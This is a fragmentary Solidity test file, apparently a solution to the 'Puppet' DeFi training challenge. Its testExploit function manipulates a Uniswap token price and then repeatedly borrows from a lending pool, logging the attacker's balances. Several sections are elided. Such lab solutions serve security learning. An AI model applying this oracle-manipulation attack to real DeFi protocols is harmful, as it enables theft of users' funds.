...
contract Puppet is Test {
    ...
    function testExploit() public {
      console.log("================================================================================");
        ...
        uint256 amountToken = 900e18;
        uint256 liquidity = 1e18;
        uint256 borrowAmount = 0;
        uint256 amountEth = uniswapExchange.getTokenToEthInputPrice(amountToken);

        dvt.approve(address(uniswapExchange), amountToken);
        ...
        for (uint i = 0; i < 10; i++) {
          puppetPool.borrow{value: 3 ether}(10_000e18);
        }
        vm.stopPrank();

        console.log("final attacker balance: %s", dvt.balanceOf(attacker));
        console.log("final attacker balance: %s", attacker.balance);
